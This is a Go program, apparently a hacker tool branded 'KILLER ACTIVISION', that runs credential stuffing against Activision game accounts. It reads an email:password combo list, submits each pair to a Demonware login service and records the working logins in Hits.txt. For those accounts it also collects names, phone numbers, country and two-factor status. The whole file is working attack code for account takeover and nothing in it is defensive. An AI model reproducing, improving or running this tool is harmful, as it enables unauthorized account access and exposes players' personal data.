package main

import (
 "bytes"
 "encoding/json"
 "fmt"
 "io/ioutil"
 "net/http"
 "strings"
 "os"
)

func main() {
 fmt.Print("\033[H\033[2J")
 fmt.Println("\033[00;36m")
 fmt.Println(`
                                 .:--=======-:.                            
                            .=+++=-:.   .=******++=:                       
                         :+*=.        .-:         .-++-                    
                       :*+.                           :++:                 
                     .*+                                 =*:               
                    :#:                                    *=              
                   =#  ..                                   %.             
                  +* .-.                                    %.             
                 +*:+-               .-:.                  *-              
                +@#=              -*#-                    -*               
               +@+            .=#@@@+=-.            .:-===%.               
             .*+.         .-+%@%+:.           :-====-:    %                
            .#.    .:=+#%%*+=-..   ..:::--===-:.       . .%                
            ++    ::%+--==++-:         .         :=++==--=%                
             =++++++@.  :.  .-++*+-.       .-++++-.  .:   #:               
                    +-   ##=:    .=%@#***#@%=.    :=##.  .#                
                     %    #%#:      -*@@@*:      :*%#.   *-                
                    *-   .*%%#=: ::   .-.   .: :=*%%#.   .*.               
                   .+=.    -+#%%%%%         #%%%%%+-.    =*-               
                     .@#:     .-*%#  :   :  +%*=.     .*@+                 
                      %#@#-       - .%% #%. :.      .*@%#-                 
                      %.#=*#.       -%% %%=        +#-%:#:                 
                      %. . %--      *+= -+*      :=%. . %.                 
                      *:   #.                     .%    %                  
                      =*   +%-                   :#*   =*                  
                       =*  -#%.: :: #: #..#..= - %#=  =*                   
                        -*   *#@*%#+@*+@*+@**@*@*%   =*                    
                         -*  -%: .  :  :  :  : .#*  -*                     
                          %                      .  *:                     
                          #:.                     ..%.                     
                          :---===-.         .-====---                      
                                 .-=++=:=+++-.                   `)
 fmt.Println("            \033[00;31m[\033[00;32m~\033[00;31m]\033[01;32mKILLER ACTIVISION [codm,warzone,warfare]\n           \033[00;31m TG  &  Github: @esfelurm")
 var input string
 fmt.Print("\n\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mAddress ComboList: \033[00;36m")
 fmt.Scanln(&input)

 file, err := ioutil.ReadFile(input)
 if err != nil {
  fmt.Println("\033[00;31mError reading file:", err)
  return
 }

 lines := strings.Split(string(file), "\n")
 for _, line := range lines {
  dataa := strings.Split(strings.TrimSpace(line), ":")

  payload := map[string]interface{}{
   "version":      1531,
   "platform":     "and",
   "hardwareType": "and",
   "auth": map[string]string{
    "email":    dataa[0],
    "password": dataa[1],
   },
  }

  body, err := json.Marshal(payload)
  if err != nil {
   fmt.Println("\033[00;31mError marshalling JSON:", err)
   return
  }

  req, err := http.NewRequest("POST", "https://wzm-and-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=atvimobile-cod-wzm-and", bytes.NewBuffer(body))
  if err != nil {
   fmt.Println("\033[00;31mError creating request:", err)
   return
  }

  req.Header.Set("Content-Type", "application/json")

  client := &http.Client{}
  resp, err := client.Do(req)
  if err != nil {
   fmt.Println("\033[00;31mError making request:", err)
   return
  }
  defer resp.Body.Close()

  resBody, err := ioutil.ReadAll(resp.Body)
  if err != nil {
   fmt.Println("\033[00;31mError reading response body:", err)
   return
  }

  response := string(resBody)


  if strings.Contains(response, "220000") || strings.Contains(response, "The provided credentials are invalid.") {
   fmt.Println("\n\033[00;31m[\033[00;36m-\033[00;31m] \033[00;31mInvalid :", dataa)
  } else if strings.Contains(response, "Error:ClientError") || strings.Contains(response, "Error:DownStreamError") || strings.Contains(response, "DownstreamBadRequest") || strings.Contains(response, "authenticate") {
   file, err := os.OpenFile("Hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
   if err != nil {
    fmt.Println("\033[00;31mError writing to file:", err)
   }
   defer file.Close()
   if _, err := file.Write([]byte(strings.Join(dataa, ":") + "\n")); err != nil {
    fmt.Println(err)
}
   fmt.Println("\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mValid :", dataa)
  } else if strings.Contains(response, "clientID") {
   var data map[string]interface{}
   err := json.Unmarshal([]byte(response), &data)
   if err != nil {
    fmt.Println("\033[00;31mError unmarshaling JSON:", err)
    return
   }
   msg := fmt.Sprintf("\n======================\nGames = %v\nUserID = %v\nYear of construction = %v\nRegion = %v\nPhone = %v | %v\nFirst Name = %v\nLast Name = %v\nTwo-step verification = %v\nLast visit = %v\nEmail & Password = %v\n\n======================", data["title"].(map[string]interface{})["clientID"], data["title"].(map[string]interface{})["userID"], data["umbrella"].(map[string]interface{})["accounts"].([]interface{})[0].(map[string]interface{})["created"], data["uno"].(map[string]interface{})["country"], data["uno"].(map[string]interface{})["phone"], data["uno"].(map[string]interface{})["mobile"], data["uno"].(map[string]interface{})["firstName"], data["uno"].(map[string]interface{})["lastName"], data["uno"].(map[string]interface{})["TFAEnabled"], data["uno"].(map[string]interface{})["updated"], dataa)

   msg2 := fmt.Sprintf("\n\033[01;33m======================\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mGames = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mUserID = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mYear of construction = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mRegion = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mPhone = %v | %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mFirst Name = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mLast Name = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mTwo-step verification = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mLast visit = %v\n\033[00;31m[\033[00;32m+\033[00;31m] \033[01;32mEmail & Password = %v\n\n\033[01;33m======================", data["title"].(map[string]interface{})["clientID"], data["title"].(map[string]interface{})["userID"], data["umbrella"].(map[string]interface{})["accounts"].([]interface{})[0].(map[string]interface{})["created"], data["uno"].(map[string]interface{})["country"], data["uno"].(map[string]interface{})["phone"], data["uno"].(map[string]interface{})["mobile"], data["uno"].(map[string]interface{})["firstName"], data["uno"].(map[string]interface{})["lastName"], data["uno"].(map[string]interface{})["TFAEnabled"], data["uno"].(map[string]interface{})["updated"], dataa)

   fmt.Printf(msg2)

   file, err := os.OpenFile("Hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
   if err != nil {
    fmt.Println("\033[00;31mError writing to file:", err)

   }
   defer file.Close()
   if _, err := file.Write([]byte(msg)); err != nil {
      fmt.Println(err)
    }
  } else if strings.Contains(response, "Uno Client for platform [and] is not configured for title") {
   fmt.Println("\n\033[00;36mBan")
  } else {
   fmt.Println("\n\033[00;36mBan")
  }
 }
}
